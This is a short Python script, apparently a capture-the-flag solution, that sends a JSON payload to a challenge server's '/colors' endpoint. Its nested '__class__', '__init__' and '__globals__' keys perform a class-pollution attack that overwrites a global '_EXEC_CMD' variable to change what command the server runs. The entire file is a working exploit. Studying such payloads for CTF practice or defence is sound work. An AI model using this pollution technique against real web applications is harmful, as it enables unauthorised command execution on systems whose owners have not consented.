import requests

url = 'http://chal1.gryphons.sg:8001/'

payload = {
    "color1": "red",
    "color2": "blue", 
    "color3": "green",
    "__class__": {
        "__init__": {
            "__globals__": {
                "_EXEC_CMD": "flag"
            }
        }
    }
}

res = requests.post(f'{url}/colors', json=payload)

print(res.text)